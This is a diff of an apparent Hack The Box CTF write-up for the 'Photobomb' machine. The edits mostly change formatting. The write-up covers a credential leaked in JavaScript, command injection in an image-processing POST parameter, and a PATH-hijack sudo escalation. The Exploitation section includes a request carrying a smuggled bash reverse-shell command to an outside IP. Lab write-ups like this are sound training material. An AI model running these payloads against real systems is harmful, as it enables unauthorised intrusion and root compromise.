@@ -2,18 +2,16 @@
 title: Photobomb
 date: 2022-10-20 12:00:00
 categories: [HTB,CTF]
-tags: [weakpw,commandinjection,sudo]
+tags: [htb]
 ---
 
-## Summary
+We are going to exploit Photobomb on Hackthebox.  
+After we inspected the Application we will find out that the Credentials for the enpoint `/printer` are leaked in a java script file.  
+To get a foothold we will exploit a command injection vulnerability in the image processor and escalate to root using sudo.  
 
-We are going to exploit Photobomb on Hackthebox.
-After we inspected the Application we will find out that the Credentials for the enpoint `/printer` are leaked in a java script file.
-To get a foothold we will exploit a command injection vulnerability in the image processor and escalate to root using sudo.
+# Enumeration
 
-## Enumeration
-
-### Rustscan
+## Rustscan
 
 We will start by doing a quick scan using Rustscan and identify that Port 22 and 80 are open.
 
@@ -49,7 +47,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### Feroxbuster
+## Feroxbuster
 
 Let's see if we can find any interesting files using feroxbuster
 
@@ -61,12 +59,12 @@ Let's see if we can find any interesting files using feroxbuster
 200      GET       22l       95w      843c http://photobomb.htb/
 ```
 
-### Website and Files
+## Website and Files
 
 When we visit the site [http://photobomb.htb](http://photobomb.htb) we are greeted with a message that we have to click to get started. The credentials are in our welcome pack according to the site.
 Since we haven't received a "welcome pack" and get asked for a username and password on [http://photobomb.htb/printer](http://photobomb.htb/printer) we inspect the application more and check `photobomb.js`
 
-#### photobomb.js
+### photobomb.js
 
 Great we found credentials to visit the restricted section.
 There are two ways we can use that info
@@ -83,14 +81,14 @@ function init() {
 window.onload = init;
 ```
 
-#### /printer
+### /printer
 
 On visiting [http://photobomb.htb/printer](http://photobomb.htb/printer) there's not much to discover except some images that we can select, setting the file type, a resolution and a buttong to download photo to print.
 That's exactly what happens when we select an image and hit `Download photo to print`, after some time we are able to download a file.
 
-## Exploitation
+# Exploitation
 
-### Shell
+## Shell
 
 Burp will help us to enumerate that behavior and request we are sending to the application further.
 We will discover that the Application takes three parameters and we're sending a POST request to the image processor backend.
@@ -141,9 +139,9 @@ Upgrade-Insecure-Requests: 1
 photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&dimensions=600x400&filetype=png;bash -c 'bash -i >& /dev/tcp/10.10.10.1/80 0>&1'
 ```
 
-## Escalation
+# Escalation
 
-### Local Enumeration
+## Local Enumeration
 
 During enumeration there was a possible privilege escalation vector discovered.
 We are able to run `/opt/cleanup.sh` as root and have privileges to set an enviroment variable.
@@ -177,7 +175,7 @@ fi
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 Checking `/opt/cleanup.sh` reveals that `find` is called without an absolute path to the binary and relies on the `PATH` environment variable.
 Let's create a new folder called `bin` in our home directory, a binary called `find` in our new folder containing a reverse shell payload
